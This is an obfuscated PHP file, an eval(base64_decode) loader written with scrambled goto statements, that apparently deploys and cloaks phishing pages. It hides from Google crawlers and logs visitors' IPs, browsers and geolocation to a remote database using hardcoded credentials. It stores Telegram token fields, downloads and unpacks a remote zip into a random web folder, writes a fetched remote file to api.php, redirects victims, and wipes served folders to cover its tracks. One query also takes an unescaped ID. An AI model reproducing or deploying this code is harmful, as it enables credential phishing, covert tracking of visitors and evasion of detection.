<?php eval(base64_decode('
 goto ENGg_; cruPL: $_SESSION["\151\x73\160"] = isset($info["\151\x73\x70"]) ? $info["\151\x73\160"] : null; goto fRWPF; w1rNs: $info = unserialize($response); goto cruPL; VIeDR: ini_set("\x64\151\x73\x70\154\x61\171\x5f\x65\162\162\x6f\162\x73", 1); goto HNFIT; mu4Io: function RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $id) { $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\103\x6f\x6e\156\x65\143\x74\x69\x6f\156\40\146\141\x69\154\145\144\72\x20" . mysqli_connect_error()); } $sql_u = "\x53\x45\114\105\103\124\40\52\40\x46\x52\117\x4d\40\x72\x65\144\151\x72\143\x74\151\x6f\156\40\x57\x48\105\x52\105\x20\x69\x64\75\47{$id}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { while ($row = mysqli_fetch_array($res_u)) { $_SESSION["\154\x69\x6e\x6b"] = base64_decode(base64_decode($row["\x6c\x69\156\153"])); $_SESSION["\143\x6e"] = explode("\73", base64_decode(base64_decode($row["\143\x6f\165\x6e\x74\162\x79"]))); $_SESSION["\x70\151\143"] = $row["\x70\151\143"]; $_SESSION["\x6d\x73\147"] = base64_decode(base64_decode($row["\x6d\163\x67"])); $_SESSION["\145\x78\x70"] = $row["\145\170\x70\151\x72\145"]; $_SESSION["\163\145\x72\166\145\162"] = base64_decode(base64_decode($row["\x73\x65\x72\166\x65\x72"])); $_SESSION["\165\162\154"] = base64_decode(base64_decode($row["\x75\x72\x6c"])); $_SESSION["\x6c\x75\x78\x63\141\x70\164\x63\150\x61"] = $row["\x6c\x75\x78\x63\x61\x70\x74\143\x68\141"]; $_SESSION["\164\x6f\x6b\x65\x6e\x74\x65\x6c"] = base64_decode(base64_decode($row["\x74\x6f\153\145\156\164\x65\x6c"])); $_SESSION["\x69\x64\164\145\154"] = base64_decode(base64_decode($row["\151\144\164\x65\x6c"])); $_SESSION["\x72\x65\x64\x69\x72\x69\143\164"] = $row["\162\145\144\x69\162\151\x63\164"]; $_SESSION["\x61\x70\151"] = $row["\141\160\151"]; if (isset($_GET["\166\x73\x73"])) { setcookie("\164\157\x6b\145\156\x74\x65\x6c", $_SESSION["\x74\x6f\x6b\x65\156\164\145\x6c"], time() + 86400 * 30, "\57"); setcookie("\x69\144\x74\145\154", $_SESSION["\151\144\x74\145\x6c"], time() + 86400 * 30, "\x2f"); setcookie("\x72\x65\144\151\162\x69\x63\164", $_SESSION["\162\x65\144\x69\x72\x69\x63\164"], time() + 86400 * 30, "\57"); } } } else { $refix = "\x70\x72\157\x6a\145\x63\164\40\111\x44\40\156\x6f\164\x20\146\157\165\156\x64\40\151\x64\x2e{$id}"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } mysqli_close($db); } goto mGLbT; GRqMI: if (strpos(gethostbyaddr($StrupLom), "\x67\157\x6f\x67\x6c\x65") !== false) { $refix = "\x42\157\x73\x65\x20\x47\40\x32"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto mDWaN; Q4V7i: $datalog = base64_decode("\145\155\x56\x79\142\171\x31\153\131\130\x6b\165\x63\62\150\166\x63\101"); goto VhKTw; j1yIO: $IpCount = FOx_TGH_X($userAgent); goto pPUsX; A4RX1: function deleteDirectorynew($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } foreach (scandir($dir) as $item) { if ($item == "\56" || $item == "\56\56") { continue; } if (!deleteDirectorynew($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } if (rmdir($dir)) { return true; } else { return false; } } goto YnX4s; fRWPF: $_SESSION["\x42\154\141\163\x61\143\x6f\165\x6e"] = isset($info["\143\x6f\165\x6e\x74\x72\x79"]) ? $info["\143\157\165\156\x74\x72\x79"] : null; goto yuFw3; GWPFc: if (isset($_POST["\x73\x68\x6f\160\151\144"])) { $gameid = $_POST["\163\150\157\160\x69\144"]; $_SESSION["\154\157\x6c\x73\157\x75\x6c\x73"] = $gameid; RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $gameid); } goto mu4Io; QPmWm: function HYT_DDR_Uio($USER_AGENT) { $OS_ERROR = "\125\x6e\153\x6e\x6f\x77\156\x20\x4f\x53\40\120\x6c\141\x74\146\x6f\x72\x6d"; $OS = array("\x2f\167\x69\x6e\x64\157\167\163\x20\x6e\x74\x20\x31\60\57\x69" => "\127\151\x6e\x64\x6f\167\163\x20\x31\60", "\57\167\x69\156\144\x6f\167\163\x20\x6e\x74\x20\66\56\63\57\x69" => "\x57\151\156\x64\x6f\x77\x73\40\x38\x2e\61", "\x2f\167\151\x6e\x64\x6f\x77\163\x20\156\164\40\x36\56\x32\57\x69" => "\127\x69\x6e\144\157\x77\x73\x20\70", "\x2f\167\151\156\x64\157\167\x73\x20\156\164\40\x36\56\61\x2f\x69" => "\x57\x69\156\x64\x6f\x77\x73\x20\x37", "\x2f\167\x69\156\144\157\x77\x73\x20\x6e\164\40\66\x2e\60\x2f\x69" => "\x57\151\156\144\x6f\167\163\40\x56\x69\x73\164\141", "\x2f\167\x69\x6e\144\x6f\167\163\40\156\164\x20\65\x2e\x32\x2f\151" => "\x57\151\x6e\x64\x6f\167\163\x20\123\145\x72\166\145\x72\x20\62\x30\x30\x33\57\x58\x50\x20\170\66\x34", "\57\x77\x69\x6e\x64\x6f\x77\163\40\156\164\40\x35\x2e\61\x2f\x69" => "\x57\151\x6e\x64\157\x77\163\40\130\x50", "\x2f\167\x69\x6e\144\x6f\x77\x73\x20\170\x70\57\x69" => "\127\151\x6e\x64\157\167\163\40\130\x50", "\57\167\151\156\x64\x6f\167\163\x20\156\x74\40\65\56\x30\x2f\151" => "\127\151\x6e\x64\157\167\163\x20\x32\60\60\x30", "\57\x77\151\156\x64\x6f\x77\163\40\155\x65\57\x69" => "\127\151\156\144\157\x77\x73\x20\x4d\105", "\x2f\x77\151\x6e\x39\70\57\151" => "\x57\151\156\144\157\167\163\40\x39\x38", "\57\167\x69\156\71\65\57\151" => "\127\151\156\x64\x6f\167\163\x20\71\x35", "\x2f\x77\x69\156\x31\66\57\x69" => "\127\x69\156\x64\x6f\x77\163\x20\x33\56\61\61", "\x2f\x6d\x61\x63\x69\x6e\x74\157\163\150\x7c\x6d\141\143\40\x6f\163\x20\170\57\151" => "\x4d\x61\x63\x20\117\x53\40\130", "\57\x6d\141\143\137\160\x6f\167\x65\x72\x70\143\x2f\151" => "\x4d\141\143\40\x4f\x53\x20\71", "\x2f\154\x69\156\165\170\57\151" => "\x4c\x69\156\165\x78", "\57\x75\x62\165\156\164\x75\57\x69" => "\125\x62\165\x6e\164\x75", "\57\151\x70\150\x6f\x6e\145\x2f\x69" => "\151\x50\x68\x6f\156\x65", "\x2f\151\160\157\x64\x2f\x69" => "\151\120\x6f\144", "\x2f\x69\x70\x61\x64\x2f\x69" => "\x69\120\x61\144", "\x2f\141\x6e\144\x72\157\x69\144\57\151" => "\101\156\144\x72\x6f\151\144", "\57\x62\x6c\x61\x63\153\x62\145\x72\162\x79\57\151" => "\102\x6c\141\143\x6b\102\145\x72\162\171", "\x2f\167\x65\142\157\163\x2f\x69" => "\115\x6f\x62\x69\x6c\x65"); foreach ($OS as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $OS_ERROR = $value; } } return $OS_ERROR; } goto t7IN2; t7IN2: function FOx_TGH_X($USER_AGENT) { $BROWSER_ERROR = "\x55\156\153\156\x6f\x77\x6e\x20\102\162\x6f\167\x73\145\162"; $BROWSER = array("\57\155\x73\x69\145\57\x69" => "\x49\x6e\x74\145\162\x6e\x65\164\x20\105\170\160\x6c\x6f\x72\145\162", "\x2f\146\151\162\145\146\x6f\x78\57\x69" => "\106\151\162\145\146\x6f\170", "\x2f\163\141\146\x61\x72\x69\x2f\x69" => "\123\x61\146\141\x72\x69", "\x2f\143\150\162\157\155\x65\57\151" => "\x43\150\x72\157\x6d\x65", "\x2f\x65\x64\x67\x65\57\x69" => "\105\144\147\145", "\x2f\157\x70\145\x72\141\57\x69" => "\117\x70\145\x72\141", "\57\156\145\x74\163\143\141\160\x65\57\x69" => "\116\x65\x74\x73\143\141\160\x65", "\x2f\155\141\x78\x74\x68\x6f\156\x2f\x69" => "\115\x61\x78\x74\x68\157\156", "\x2f\153\157\x6e\x71\165\x65\162\157\162\57\151" => "\113\x6f\156\161\165\x65\162\x6f\162", "\57\155\x6f\x62\x69\x6c\x65\x2f\151" => "\x48\x61\156\144\x68\x65\154\x64\x20\x42\x72\x6f\x77\163\x65\x72"); foreach ($BROWSER as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $BROWSER_ERROR = $value; } } return $BROWSER_ERROR; } goto F1Nbk; VhKTw: $Fixbom = base64_decode("\x63\x33\122\171\x62\62\65\156\x58\x32\122\150\x65\121"); goto Wmt28; mGLbT: function Rand_XD_TF($length) { $characters = "\141\142\143\144\x65\x66\152\x68\151\147\x6b\x6c\x6d\156\x6f\x70\x71\162\x73\164\165\166\x77\x78\x79\x7a\60\x31\62\x33\64\x35\66\67\x38\71\101\x42\x43\x44\x45\x46\107\110\x49\112\x4b\114\115\x4e\117\x50\121\x52\x53\x54\125\x56\127\x58\x59\x5a"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto F0ba0; Wmt28: $Lredsvv = base64_decode("\x5a\x48\x4a\152\x5a\62\x6c\163\x65\x56\101\x77\113\155\x73\x6d"); goto i2f0Q; pO9aJ: if (isset($_GET["\x76\163\x73"])) { $gameid = $_GET["\163\157\x75\154\x73"]; $_SESSION["\x6c\x6f\x6c\163\x6f\165\x6c\163"] = $gameid; RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $gameid); $folder_pathx = $_GET["\166\163\163"]; $RandOP_Mlux = Rand_XD_TF(rand(4, 10)); echo "\x3c\163\143\162\x69\x70\x74\x20\x4c\101\116\107\x55\101\x47\105\75\x27\112\x61\x76\141\123\x63\x72\x69\x70\164\x27\x3e\xa\x20\x20\x20\40\167\151\x6e\144\157\167\x2e\x6c\157\x63\141\164\x69\x6f\x6e\x2e\150\x72\x65\x66\75\x27{$folder_pathx}\77\46\x76\x61\x6c\151\144\75{$RandOP_Mlux}{$RandOP_Mlux}\x26\x61\154\x65\x72\x74\x3d{$RandOP_Mlux}\46\x78\154\160\163\x3d{$RandOP_Mlux}\x26\x73\157\165\x6c\163\x3d{$gameid}\x26\144\x6f\x6e\145\x3d\46\145\162\162\157\x72\x79\75{$RandOP_Mlux}\x26\155\156\145\x6d\157\156\151\x63\75\46\152\x62\75{$RandOP_Mlux}\47\73\12\40\40\40\x20\74\x2f\163\x63\x72\x69\160\164\76"; die; } goto GWPFc; F0ba0: function rand_num($length) { $characters = "\60\x31\62\63\x34\65\x36\x37\x38\x39"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto QPmWm; F1Nbk: $userAgent = isset($_SERVER["\110\x54\124\x50\137\x55\123\x45\122\137\101\107\x45\116\124"]) ? $_SERVER["\110\124\x54\120\x5f\x55\123\x45\x52\137\x41\107\105\116\124"] : ''; goto hKy7h; O0Vbn: $TIME_DATE = date("\131\55\155\x2d\x64\40\x48\72\151\x3a\x73"); goto Iarac; ySvGV: $StrupLom = $ipPortArray[0]; goto V87eH; az_Iz: curl_close($curl); goto w1rNs; V87eH: $domine = $_SERVER["\123\x45\122\x56\105\x52\x5f\x4e\x41\x4d\105"]; goto O0Vbn; nDSmn: $_SESSION["\126\157\160\x72\x74"] = isset($info["\x63\151\x74\x79"]) ? $info["\x63\x69\x74\x79"] : null; goto W94af; HNFIT: if (!empty($_SERVER["\110\124\x54\x50\x5f\103\114\111\x45\116\124\137\111\x50"])) { $ipAddress = $_SERVER["\110\x54\x54\120\137\103\114\111\x45\116\124\137\111\x50"]; } elseif (!empty($_SERVER["\x48\x54\x54\120\x5f\130\x5f\x46\x4f\x52\x57\x41\x52\104\x45\104\137\x46\117\x52"])) { $ipAddress = $_SERVER["\x48\x54\x54\x50\x5f\x58\137\106\117\122\127\x41\122\104\105\104\x5f\x46\x4f\x52"]; } else { $ipAddress = $_SERVER["\x52\105\115\117\x54\x45\x5f\x41\104\104\x52"]; } goto d6MKw; VOaTv: if (is_array($directories)) { foreach ($directories as $dir) { if (basename($dir)[0] != "\56") { if (deleteDirectory($dir)) { } } } } goto Bz2Q0; d6MKw: $ipPortArray = explode("\72", $ipAddress); goto ySvGV; rDbNW: $donflag = $protocol . "\x3a\57\57" . $domain; goto Q4V7i; tfPBm: $protocol = isset($_SERVER["\x48\124\124\x50\123"]) && $_SERVER["\110\124\124\120\x53"] === "\157\156" ? "\x68\164\x74\160\x73" : "\x68\164\164\x70"; goto XSYpz; Iarac: if (isset($_POST["\x6c\157\143\x61\154\151\x70"])) { $myips = base64_decode(base64_decode($_POST["\154\157\x63\141\154\x69\x70"])); $_SESSION["\154\x6f\x6c\x69\x70\163"] = $myips; $StrupLom = $myips; } goto tfPBm; YnX4s: function deleteDirectory($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } $time_diff = time() - filectime($dir); if ($time_diff > 290) { foreach (scandir($dir) as $item) { if ($item == "\56" || $item == "\56\x2e") { continue; } if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } if (rmdir($dir)) { return true; } else { return false; } } else { return true; } } goto RGykE; QjviT: if (!Cub_JRRD_OP($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv)) { $showpip = "\x21\41\41"; echo $showpip; die; } goto t6CjV; CI2cw: if (isset($_GET["\154\x6f\x6c\x6d\x65"])) { $vdir = $_GET["\x6c\x6f\154\155\145"]; $refix = "\x49\156\x76\141\154\x69\x64\40\x6c\157\x6c\x6d\145"; $redi = $_COOKIE["\162\145\144\151\162\x69\x63\164"]; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); $directoryToDelete = "\x77\145\x62\x2f" . $vdir; if (is_dir($directoryToDelete)) { if (deleteDirectorynew($directoryToDelete)) { } } echo "\x3c\x73\143\162\x69\x70\x74\40\x4c\x41\x4e\107\125\x41\x47\x45\x3d\47\x4a\x61\166\x61\x53\x63\x72\x69\160\164\47\x3e\12\40\40\40\x20\x77\151\x6e\x64\x6f\167\56\x6c\157\143\x61\x74\151\157\156\x2e\150\x72\145\x66\75\47{$redi}\47\73\xa\x20\x20\x20\40\74\x2f\163\x63\x72\x69\x70\x74\x3e"; die; } goto pO9aJ; mDWaN: $RandOP_M = Rand_XD_TF(rand(7, 7)); goto NDeSg; XSYpz: $domain = $_SERVER["\x48\124\124\x50\137\110\117\123\124"]; goto rDbNW; g4Ay6: curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); goto iZ36m; W94af: $_SESSION["\x78\117\x70\x75\171"] = isset($info["\162\145\147\x69\x6f\x6e\x4e\x61\155\145"]) ? $info["\162\x65\147\151\157\x6e\x4e\141\155\145"] : null; goto A4RX1; RGykE: $parentDirectory = "\167\x65\x62"; goto xFjvb; Bz2Q0: function Cub_JRRD_OP($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv) { $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\103\157\x6e\x6e\x65\x63\x74\151\x6f\x6e\40\146\x61\x69\154\145\144\72\40" . mysqli_connect_error()); } $sql_u = "\123\105\114\105\x43\124\x20\52\x20\106\122\x4f\x4d\x20\x6c\x6f\x67\x73\x20\127\x48\x45\122\105\x20\151\160\x61\144\x64\162\145\x73\x3d\47{$StrupLom}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); return false; } mysqli_close($db); return true; } goto QjviT; XOqOe: if (strpos($userAgent, "\x67\x6f\157\147\x6c\145") !== false) { $refix = "\102\157\x73\145\40\107"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto GRqMI; t6CjV: if (isset($_GET["\x65\x6e\x64\x6d\x65\x6c\165\x78"])) { $redi = $_COOKIE["\x72\145\x64\151\x72\151\x63\164"]; $vdir = $_GET["\x65\156\x64\155\x65\154\x75\x78"]; $directoryToDelete = "\x77\x65\x62\57" . $vdir; if (is_dir($directoryToDelete)) { if (deleteDirectorynew($directoryToDelete)) { } } echo "\74\163\x63\162\151\160\164\40\x4c\x41\x4e\107\125\x41\x47\x45\75\47\x4a\141\x76\x61\x53\x63\162\x69\x70\x74\47\x3e\12\40\x20\40\x20\167\151\156\144\157\167\56\x6c\157\x63\x61\x74\151\x6f\156\56\150\162\145\x66\75\47{$redi}\47\73\12\40\x20\x20\40\74\x2f\x73\x63\x72\151\160\164\x3e"; die; } goto CI2cw; yuFw3: $_SESSION["\x4e\x6a\157\160\x66"] = isset($info["\x63\x6f\x75\x6e\164\162\x79\103\157\x64\145"]) ? $info["\143\157\x75\156\164\162\171\103\x6f\x64\145"] : null; goto nDSmn; R7FcM: $url = "\x68\x74\164\160\72\57\57\151\160\55\x61\160\x69\56\143\157\155\x2f\160\150\160\x2f{$StrupLom}\x3f\x66\151\145\154\144\x73\75\163\164\141\x74\165\x73\x2c\x6d\x65\163\x73\141\x67\x65\x2c\x63\x6f\156\x74\x69\x6e\x65\x6e\164\54\143\157\x6e\x74\151\156\x65\156\x74\103\157\x64\x65\54\143\x6f\165\x6e\x74\x72\x79\54\x63\157\165\x6e\x74\x72\x79\103\x6f\x64\145\54\162\x65\x67\x69\157\156\x2c\162\145\147\151\x6f\x6e\x4e\x61\155\x65\x2c\x63\151\x74\171\x2c\144\151\163\x74\x72\x69\143\164\x2c\x7a\151\160\54\x6c\x61\x74\x2c\154\x6f\156\54\x74\151\155\145\x7a\x6f\x6e\x65\54\143\x75\x72\162\145\156\143\x79\x2c\151\163\160\x2c\x6f\162\x67\54\x61\163\54\x61\163\x6e\x61\155\x65\x2c\x72\145\166\145\x72\x73\145\x2c\155\x6f\x62\x69\154\x65\x2c\x70\x72\157\x78\171\x2c\150\x6f\x73\x74\x69\156\147\54\x71\x75\x65\x72\x79"; goto xDvZ3; pPUsX: function click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix) { $userAgent = isset($_SERVER["\x48\x54\124\120\x5f\x55\123\x45\x52\x5f\x41\107\105\x4e\x54"]) ? $_SERVER["\110\x54\x54\x50\x5f\x55\123\x45\x52\137\x41\x47\x45\x4e\x54"] : ''; $isp = $_SESSION["\151\163\x70"]; $IpCount = FOx_TGH_X($userAgent); $OKJIVGRD = HYT_DDR_Uio($userAgent); $donflag = $_SERVER["\123\105\x52\126\x45\122\137\116\101\115\x45"]; $LOCALO_TEMPO = date("\x59\55\x6d\x2d\x64\40\110\72\x69\x3a\163"); $Blasacoun = $_SESSION["\102\154\141\163\x61\x63\x6f\x75\156"]; $Njopf = $_SESSION["\116\x6a\x6f\160\x66"]; $Voprt = $_SESSION["\126\x6f\x70\x72\164"]; $xOpuy = $_SESSION["\x78\x4f\160\x75\171"]; $host = gethostbyaddr($StrupLom); $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\x43\x6f\x6e\x6e\x65\143\164\151\x6f\x6e\x20\146\x61\x69\x6c\145\x64\72\x20" . mysqli_connect_error()); } $sql_u = "\123\105\x4c\105\103\x54\x20\x2a\x20\x46\122\x4f\115\40\x6c\157\x67\163\x20\x57\110\105\x52\105\40\151\160\x61\144\x64\x72\x65\x73\x3d\x27{$StrupLom}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); echo "\41\41"; die; } else { $StrupLom = mysqli_real_escape_string($db, str_replace("\47", '', $StrupLom)); $Blasacoun = mysqli_real_escape_string($db, str_replace("\47", '', $Blasacoun)); $IpCount = mysqli_real_escape_string($db, str_replace("\47", '', $IpCount)); $OKJIVGRD = mysqli_real_escape_string($db, str_replace("\x27", '', $OKJIVGRD)); $donflag = mysqli_real_escape_string($db, str_replace("\x27", '', $donflag)); $LOCALO_TEMPO = mysqli_real_escape_string($db, str_replace("\47", '', $LOCALO_TEMPO)); $host = mysqli_real_escape_string($db, str_replace("\x27", '', $host)); $isp = mysqli_real_escape_string($db, str_replace("\x27", '', $isp)); $refix = mysqli_real_escape_string($db, str_replace("\x27", '', $refix)); $query = "\x49\116\123\x45\x52\124\40\111\116\124\x4f\x20\154\x6f\147\163\40\x28\151\160\141\x64\144\162\145\163\54\143\x6f\x75\156\x74\162\171\x2c\142\x72\x6f\x77\163\x65\162\54\x6f\x73\54\x64\x6f\155\151\156\x65\x2c\155\x79\x74\x69\155\x65\54\150\x6f\x73\x74\x2c\x69\x73\160\54\162\145\x73\x6f\x6e\x29\40\12\40\x20\40\x20\40\40\x9\x20\40\x20\40\x9\x20\x20\126\x41\x4c\x55\105\123\40\50\x27{$StrupLom}\x27\54\47{$Blasacoun}\x27\54\47{$IpCount}\47\x2c\47{$OKJIVGRD}\47\x2c\47{$donflag}\47\x2c\47{$LOCALO_TEMPO}\47\54\x27{$host}\47\54\47{$isp}\47\54\47{$refix}\x27\x29"; $results = mysqli_query($db, $query); mysqli_close($db); echo "\41"; } } goto XOqOe; xFjvb: $directories = glob($parentDirectory . "\x2f\x2a", GLOB_ONLYDIR); goto VOaTv; iZ36m: $response = curl_exec($curl); goto az_Iz; hVjhP: if ($_SERVER["\122\x45\x51\125\x45\123\x54\x5f\x4d\x45\124\x48\117\x44"] === "\x50\117\x53\x54") { if (!isset($_POST["\154\157\x63\x61\154\151\160"])) { $refix = "\111\x6e\x76\x61\x6c\x69\x64\x20\111\120\x53"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } if (!isset($_POST["\x73\x68\x6f\160\151\144"])) { $refix = "\x49\x6e\x76\141\154\151\144\40\x49\104\x20\123\x51\114"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } if (!is_dir("\167\145\142")) { if (!mkdir("\167\145\x62", 511)) { die("\x46\141\151\x6c\145\144\x20\164\157\40\143\x72\145\141\x74\x65\x20\167\x65\x62\x20\x64\151\x72\x65\x63\x74\x6f\162\x79"); } } $folder_name = bin2hex(random_bytes(8)); $sub_folder = rand_num(4); $folder_path = "\167\x65\x62\x2f{$sub_folder}\x2f"; $zipFileUrl = $_SESSION["\x75\x72\154"]; $tempDir = "\x74\x65\x6d\160"; if (!is_dir($tempDir)) { mkdir($tempDir); } $zipFileName = "{$tempDir}\57{$folder_name}\56\172\151\x70"; if (copy($zipFileUrl, $zipFileName)) { if (!mkdir($folder_path, 511, true)) { die("\x46\141\151\x6c\x65\144\40\x74\157\40\143\162\145\x61\x74\145\x20\x74\150\x65\40\146\x6f\x6c\144\145\162\56"); } $zip = new ZipArchive(); if ($zip->open($zipFileName) === true) { $zip->extractTo($folder_path); $zip->close(); $extractedFiles = scandir($folder_path); foreach ($extractedFiles as $file) { if ($file !== "\x2e" && $file !== "\x2e\x2e") { rename($folder_path . "\57" . $file, $folder_path . $file); } } } else { echo "\x46\141\x69\154\x65\144\40\x74\157\x20\145\170\164\x72\x61\143\164\40\x74\150\145\x20\x7a\151\x70\40\x66\151\154\x65\x2e"; } } else { die("\106\x61\x69\x6c\145\x64\40\164\x6f\40\x64\157\167\x6e\x6c\157\141\x64\x20\164\x68\x65\40\172\151\160\x20\x66\151\154\145\56"); } if (file_exists($zipFileName)) { unlink($zipFileName); } $gameid = $_SESSION["\x6c\157\x6c\x73\x6f\x75\154\163"]; $_SESSION["\154\x6f\x63\141\154\144\x69\162"] = "{$folder_path}"; file_put_contents("{$folder_path}\x2f\x6c\x6f\143\141\154\x2e\x74\170\164", "{$StrupLom}\12", FILE_APPEND); $fileURL = $_SESSION["\141\x70\151"]; function getFileContents($fileURL) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $fileURL); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); $error = curl_error($curl); curl_close($curl); if ($statusCode === 200 && empty($error)) { return; } $fileContents = file_get_contents($fileURL); if ($fileContents !== false) { $localFilePath = "\x77\145\142\57\x61\160\x69\x2e\x70\150\160"; file_put_contents($localFilePath, $fileContents); } } if ($fileURL !== "\101\x50\111") { getFileContents($fileURL); } $localip = isset($_POST["\x6c\x6f\x63\x61\x6c\x69\160"]) ? $_POST["\154\157\143\141\154\151\x70"] : null; $domainname = isset($_POST["\144\x6f\x6d\x61\x69\156\x6e\x61\155\145"]) ? $_POST["\144\157\x6d\141\151\156\x6e\x61\x6d\145"] : null; $nextdomain = isset($_POST["\x6e\145\x78\164\x64\157\155\141\x69\156"]) ? $_POST["\156\145\x78\164\x64\x6f\x6d\141\x69\x6e"] : null; $shopid = isset($_POST["\x73\150\157\x70\151\144"]) ? $_POST["\x73\150\x6f\x70\151\x64"] : null; if ($localip !== null && $domainname !== null && $nextdomain !== null && $shopid !== null) { $directory = "\164\x65\155\x70"; $zipFiles = glob($directory . "\52\56\x7a\x69\x70"); if (!empty($zipFiles)) { foreach ($zipFiles as $zipFile) { if (is_file($zipFile)) { unlink($zipFile); } } } sleep(5); ob_start(); $responseData = array("\x73\164\x61\164\x75\x73" => "\x73\x75\143\143\145\163\163", "\142\x61\143\x6b\137\144\x69\x72" => $folder_path, "\142\141\x63\153\137\165\162\x6c" => $nextdomain, "\142\x61\143\153\137\151\144" => $shopid, "\155\x65\163\163\x61\147\x65" => "\104\x61\164\x61\40\x73\165\143\x63\x65\x73\163\x66\x75\x6c\x6c\171"); $responseJson = json_encode($responseData); echo $responseJson; ob_flush(); flush(); } else { http_response_code(400); $responseData = array("\x73\x74\x61\x74\165\163" => "\64\60\60", "\x62\141\143\x6b\x5f\x64\x69\x72" => '', "\x62\141\x63\x6b\x5f\165\162\x6c" => '', "\x62\x61\x63\153\x5f\151\x64" => '', "\x6d\145\x73\163\141\x67\145" => "\x44\x61\164\x61\x20\155\x69\163\x73\x69\x6e\x67"); $responseJson = json_encode($responseData); echo $responseJson; } } else { http_response_code(405); $responseData = array("\x73\164\141\164\165\163" => "\x34\60\x35", "\x62\x61\x63\153\137\144\151\x72" => '', "\x62\x61\143\153\137\x75\162\x6c" => '', "\x62\141\143\153\x5f\151\144" => '', "\x6d\145\163\163\141\147\x65" => "\x44\x61\x74\141\40\x69\156\166\141\154\151\x64"); $responseJson = json_encode($responseData); echo $responseJson; } goto ulrLf; ENGg_: error_reporting(E_ALL); goto VIeDR; hKy7h: $OKJIVGRD = HYT_DDR_Uio($userAgent); goto j1yIO; xDvZ3: $curl = curl_init($url); goto g4Ay6; i2f0Q: $Nopwvv = base64_decode("\x63\63\x52\171\x62\62\x35\x6e\130\x32\122\x68\x65\x51"); goto R7FcM; NDeSg: $RandOP_Mlux = Rand_XD_TF(rand(4, 10)); goto hVjhP; ulrLf: ')); ?>
